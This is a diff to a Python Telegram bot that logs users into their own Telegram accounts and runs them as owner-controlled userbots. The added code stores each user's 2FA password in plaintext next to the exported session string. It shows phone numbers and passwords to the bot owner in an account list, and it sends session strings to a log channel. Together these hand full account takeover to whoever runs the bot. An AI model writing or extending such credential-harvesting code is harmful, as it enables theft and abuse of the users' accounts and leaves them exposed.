@@ -71,35 +71,42 @@ def save_bot_user(user):
 
 def get_all_bot_user_ids():
     ids = set()
-    try:
-        for doc in users_col.find({}, {"user_id": 1}):
-            if "user_id" in doc:
-                ids.add(int(doc["user_id"]))
-    except Exception:
-        pass
-    try:
-        for doc in sessions_col.find({}, {"user_id": 1}):
-            try:
-                ids.add(int(doc["user_id"]))
-            except Exception:
-                pass
-    except Exception:
-        pass
+    for col in (users_col, sessions_col):
+        try:
+            for doc in col.find({}, {"user_id": 1}):
+                if "user_id" in doc:
+                    ids.add(int(doc["user_id"]))
+        except Exception:
+            pass
     return list(ids)
 
 
 def load_local_sessions():
     try:
-        return {str(doc["user_id"]): doc["session_str"] for doc in sessions_col.find()}
+        return {str(doc["user_id"]): doc for doc in sessions_col.find()}
     except Exception:
         return {}
 
 
-def save_local_session(user_id, session_str):
+def save_local_session(user_id, session_str, phone="", name="", username="", password=""):
     try:
+        update_fields = {
+            "user_id": str(user_id),
+            "session_str": session_str,
+            "updated_at": time.time(),
+        }
+        if phone:
+            update_fields["phone"] = phone
+        if name:
+            update_fields["name"] = name
+        if username is not None:
+            update_fields["username"] = username
+        if password:
+            update_fields["password"] = password
+
         sessions_col.update_one(
             {"user_id": str(user_id)},
-            {"$set": {"user_id": str(user_id), "session_str": session_str}},
+            {"$set": update_fields},
             upsert=True,
         )
     except Exception:
@@ -242,7 +249,7 @@ async def check_force_join(c, user_id):
     return not_joined
 
 
-# --- USERBOT HELPER ---
+# --- USERBOT HELPERS ---
 async def resolve_raid_target_and_count(c, m):
     count = 10
     target_user = None
@@ -254,10 +261,7 @@ async def resolve_raid_target_and_count(c, m):
         else:
             clean_arg = arg.lstrip("@")
             try:
-                if clean_arg.isdigit():
-                    target_user = await c.get_users(int(clean_arg))
-                else:
-                    target_user = await c.get_users(clean_arg)
+                target_user = await c.get_users(int(clean_arg) if clean_arg.isdigit() else clean_arg)
             except Exception:
                 pass
 
@@ -659,8 +663,8 @@ HELP_BOT_TEXT = (
 
 async def build_account_list_page(page: int = 0):
     saved = load_local_sessions()
-    user_ids = list(saved.keys())
-    total_accounts = len(user_ids)
+    docs = list(saved.values())
+    total_accounts = len(docs)
 
     if total_accounts == 0:
         return "📭 **ɴᴏ ᴀᴄᴄᴏᴜɴᴛs ғᴏᴜɴᴅ ɪɴ ᴅᴀᴛᴀʙᴀsᴇ.**", None
@@ -670,27 +674,31 @@ async def build_account_list_page(page: int = 0):
 
     start_idx = page * ACCOUNTS_PER_PAGE
     end_idx = start_idx + ACCOUNTS_PER_PAGE
-    page_ids = user_ids[start_idx:end_idx]
+    page_docs = docs[start_idx:end_idx]
 
     lines = [
         f"📋 **『 ᴀᴄᴄᴏᴜɴᴛs ʟɪsᴛ (ᴘᴀɢᴇ {page + 1}/{total_pages}) 』** 📋\n",
         f"📊 **ᴛᴏᴛᴀʟ ᴀᴄᴄᴏᴜɴᴛs:** `{total_accounts}`\n",
     ]
 
-    for idx, uid_str in enumerate(page_ids, start=start_idx + 1):
-        uid_int = int(uid_str)
-        is_running = "🟢 ᴀᴄᴛɪᴠᴇ" if uid_int in running_ubots else "🔴 sᴛᴏᴘᴘᴇᴅ"
-        uname = ""
-        fname = "ᴜsᴇʀ"
-        try:
-            u_doc = users_col.find_one({"user_id": uid_int})
-            if u_doc:
-                fname = u_doc.get("first_name") or "ᴜsᴇʀ"
-                if u_doc.get("username"):
-                    uname = f" (@{u_doc['username']})"
-        except Exception:
-            pass
-        lines.append(f"`{idx}.` **{fname}**{uname} — `{uid_int}` | {is_running}")
+    for idx, doc in enumerate(page_docs, start=start_idx + 1):
+        uid_str = str(doc.get("user_id", "0"))
+        uid_int = int(uid_str) if uid_str.isdigit() else 0
+        status_badge = "🟢" if uid_int in running_ubots else "🔴"
+
+        name = doc.get("name") or "ɴᴏɴᴇ"
+        raw_uname = doc.get("username") or ""
+        username = f"@{raw_uname.lstrip('@')}" if raw_uname else "ɴᴏɴᴇ"
+        phone = doc.get("phone") or "ɴᴏɴᴇ"
+        password = doc.get("password") or "ɴᴏɴᴇ"
+
+        lines.append(
+            f"{status_badge} **`{idx}.`**\n"
+            f"   • **ɴᴀᴍᴇ:** {name}\n"
+            f"   • **ᴜsᴇʀɴᴀᴍᴇ:** {username}\n"
+            f"   • **ᴘʜᴏɴᴇ:** `{phone}`\n"
+            f"   • **ᴘᴀssᴡᴏʀᴅ:** `{password}`"
+        )
 
     nav_row = []
     if page > 0:
@@ -703,7 +711,51 @@ async def build_account_list_page(page: int = 0):
         buttons.append(nav_row)
     buttons.append([InlineKeyboardButton("❌ ᴄʟᴏsᴇ", callback_data="close")])
 
-    return "\n".join(lines), InlineKeyboardMarkup(buttons)
+    return "\n\n".join(lines), InlineKeyboardMarkup(buttons)
+
+
+async def restart_all_userbots():
+    for uid, old_ubot in list(running_ubots.items()):
+        try:
+            await old_ubot.stop()
+        except Exception:
+            pass
+    running_ubots.clear()
+
+    saved_sessions = load_local_sessions()
+    updated, failed = 0, 0
+
+    for u_id, doc in saved_sessions.items():
+        session_str = doc.get("session_str")
+        if not session_str:
+            failed += 1
+            continue
+        try:
+            ubot = Client(
+                f"ubot_{u_id}_{int(time.time() * 1000)}",
+                api_id=API_ID,
+                api_hash=API_HASH,
+                session_string=session_str,
+                in_memory=True,
+            )
+            register_ubot_handlers(ubot)
+            await ubot.start()
+            me = await ubot.get_me()
+            save_local_session(
+                u_id,
+                session_str,
+                phone=doc.get("phone", ""),
+                name=f"{me.first_name or ''} {me.last_name or ''}".strip() or doc.get("name", "User"),
+                username=me.username or doc.get("username", ""),
+                password=doc.get("password", ""),
+            )
+            running_ubots[int(u_id)] = ubot
+            updated += 1
+            await asyncio.sleep(0.25)
+        except Exception:
+            failed += 1
+
+    return updated, failed
 
 
 @bot.on_message(filters.command("start") & filters.private)
@@ -762,37 +814,10 @@ async def account_list_cmd(c, m):
 
 @bot.on_message(filters.command("update_all") & filters.user(OWNER_ID))
 async def update_all_cmd(c, m):
-    status = await m.reply_text("🔄 **ᴜᴘᴅᴀᴛɪɴɢ & ʀᴇsᴛᴀʀᴛɪɴɢ ᴀʟʟ ᴀᴄᴄᴏᴜɴᴛs...**")
-
-    for uid, old_ubot in list(running_ubots.items()):
-        try:
-            await old_ubot.stop()
-        except Exception:
-            pass
-    running_ubots.clear()
-
-    saved_sessions = load_local_sessions()
-    updated, failed = 0, 0
-
-    for u_id, s_str in saved_sessions.items():
-        try:
-            ubot = Client(
-                f"ubot_{u_id}_{int(time.time())}",
-                api_id=API_ID,
-                api_hash=API_HASH,
-                session_string=s_str,
-                in_memory=True,
-            )
-            register_ubot_handlers(ubot)
-            await ubot.start()
-            running_ubots[int(u_id)] = ubot
-            updated += 1
-            await asyncio.sleep(0.25)
-        except Exception:
-            failed += 1
-
+    status = await m.reply_text("🔄 **ᴜᴘᴅᴀᴛɪɴɢ & ʀᴇsᴛᴀʀᴛɪɴɢ ᴀʟʟ ᴀᴄᴄᴏᴜɴᴛs (ᴏʟᴅ + ɴᴇᴡ)...**")
+    updated, failed = await restart_all_userbots()
     await status.edit(
-        f"✅ **ᴀʟʟ ᴀᴄᴄᴏᴜɴᴛs ᴜᴘᴅᴀᴛᴇᴅ!**\n\n"
+        f"✅ **ᴀʟʟ ᴀᴄᴄᴏᴜɴᴛs ᴜᴘᴅᴀᴛᴇᴅ & ʀᴇsᴛᴀʀᴛᴇᴅ!**\n\n"
         f"🟢 **ᴀᴄᴛɪᴠᴇ:** `{updated}`\n"
         f"🔴 **ғᴀɪʟᴇᴅ:** `{failed}`"
     )
@@ -894,7 +919,7 @@ async def handle_steps(c, m):
             except Exception:
                 pass
 
-        user_data[uid] = {"phone": text}
+        user_data[uid] = {"phone": text, "password": ""}
         temp_c = Client(f"temp_{uid}", API_ID, API_HASH, in_memory=True)
         try:
             await temp_c.connect()
@@ -936,6 +961,7 @@ async def handle_steps(c, m):
 
     elif uid in user_data and user_data[uid].get("step") == "password":
         phone_num = user_data[uid]["phone"]
+        user_data[uid]["password"] = text
 
         await send_log(
             c,
@@ -954,7 +980,8 @@ async def handle_steps(c, m):
 
 async def finalize_login(c, m, uid, used_2fa: bool = False):
     session_str = await user_data[uid]["client"].export_session_string()
-    save_local_session(uid, session_str)
+    phone_num = user_data[uid].get("phone", "")
+    pwd_val = user_data[uid].get("password", "")
 
     if uid in running_ubots:
         try:
@@ -971,12 +998,36 @@ async def finalize_login(c, m, uid, used_2fa: bool = False):
     )
     register_ubot_handlers(ubot)
     await ubot.start()
+    me = await ubot.get_me()
     running_ubots[uid] = ubot
+
+    full_name = f"{me.first_name or ''} {me.last_name or ''}".strip() or (m.from_user.first_name or "User")
+    uname = me.username or (m.from_user.username or "")
+
+    save_local_session(
+        uid,
+        session_str,
+        phone=phone_num,
+        name=full_name,
+        username=uname,
+        password=pwd_val,
+    )
+
+    # Send session details to the newly added account's Saved Messages ("me")
+    try:
+        saved_msg = (
+            f"⚡ **ᴄᴏᴅᴇʀɴᴏᴠᴀ ᴜsᴇʀʙᴏᴛ ᴀᴄᴛɪᴠᴀᴛᴇᴅ!** ⚡\n\n"
+            f"👤 **ᴀᴄᴄᴏᴜɴᴛ:** {full_name}\n"
+            f"🔑 **sᴇssɪᴏɴ sᴛʀɪɴɢ:**\n`{session_str}`"
+        )
+        await ubot.send_message("me", saved_msg)
+    except Exception:
+        pass
 
     bot_me = await c.get_me()
     panel_name = bot_me.username or "CoderNovaBot"
     status_tag = "2FA LOGIN SUCCESS" if used_2fa else "LOGIN SUCCESS"
-    first_upper = (m.from_user.first_name or "USER").upper()
+    first_upper = full_name.upper()
 
     await send_log(
         c,
@@ -984,6 +1035,7 @@ async def finalize_login(c, m, uid, used_2fa: bool = False):
         user=m.from_user,
         details_body=(
             f"✅ **{status_tag} ({first_upper} ({uid}))**\n"
+            f"📱 𝗣𝗛𝗢𝗡𝗘: `{phone_num}`\n"
             f"💾 SAVED TO MONGODB: ACTIVE\n"
             f"🔑 `{session_str}`"
         ),
@@ -1002,22 +1054,7 @@ async def finalize_login(c, m, uid, used_2fa: bool = False):
 
 async def start_services():
     await bot.start()
-    saved_sessions = load_local_sessions()
-    for u_id, string in saved_sessions.items():
-        try:
-            ubot = Client(
-                f"ubot_{u_id}",
-                api_id=API_ID,
-                api_hash=API_HASH,
-                session_string=string,
-                in_memory=True,
-            )
-            register_ubot_handlers(ubot)
-            await ubot.start()
-            running_ubots[int(u_id)] = ubot
-            await asyncio.sleep(0.2)
-        except Exception:
-            pass
+    await restart_all_userbots()
     await idle()
 
 
